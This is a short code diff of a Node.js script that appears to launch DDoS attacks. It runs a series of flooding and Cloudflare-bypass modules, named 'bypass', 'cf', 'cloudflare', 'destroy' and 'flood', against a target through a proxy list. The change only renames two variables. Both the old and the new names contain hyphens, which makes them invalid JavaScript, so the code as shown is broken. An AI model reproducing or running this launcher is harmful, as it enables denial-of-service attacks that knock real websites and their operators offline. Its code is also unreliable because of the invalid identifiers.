@@ -593,8 +593,8 @@ const bypass = path.join(__dirname, `/lib/methode/bypass`);
 const bypass1 = path.join(__dirname, `/lib/methode/bypass1`);
 const bypass2 = path.join(__dirname, `/lib/methode/bypass2`);
 const cf = path.join(__dirname, `/lib/methode/cf`);
-const cf1-pro = path.join(__dirname, `/lib/methode/cf-pro`);
-const cf2-good = path.join(__dirname, `/lib/methode/cf-good`);
+const caf-pro = path.join(__dirname, `/lib/methode/cf-pro`);
+const cif-good = path.join(__dirname, `/lib/methode/cf-good`);
 const cloudflare = path.join(__dirname, `/lib/methode/cloudflare`);
 const destroy = path.join(__dirname, `/lib/methode/destroy`);
 const flood = path.join(__dirname, `/lib/methode/flood`);
@@ -612,8 +612,8 @@ exec(`node ${bypass} ${target} ${duration} 64 proxy.txt --full`)
 exec(`node ${bypass1} ${target} ${duration} 64 proxy.txt --full`)
 exec(`node ${bypass2} ${target} ${duration} 64 proxy.txt --full`)
 exec(`node ${cf} ${target} ${duration} 64 proxy.txt --full`)
-exec(`node ${cf1-pro} ${target} ${duration} 64 proxy.txt --full`)
-exec(`node ${cf2-good} ${target} ${duration} 64 proxy.txt --full`)
+exec(`node ${caf-pro} ${target} ${duration} 64 proxy.txt --full`)
+exec(`node ${cif-good} ${target} ${duration} 64 proxy.txt --full`)
 exec(`node ${cloudflare} ${target} ${duration} 64 proxy.txt --full`)
 exec(`node ${destroy} ${target} ${duration} 64 proxy.txt --full`)
 exec(`node ${flood} ${target} ${duration} 64 proxy.txt --full`)
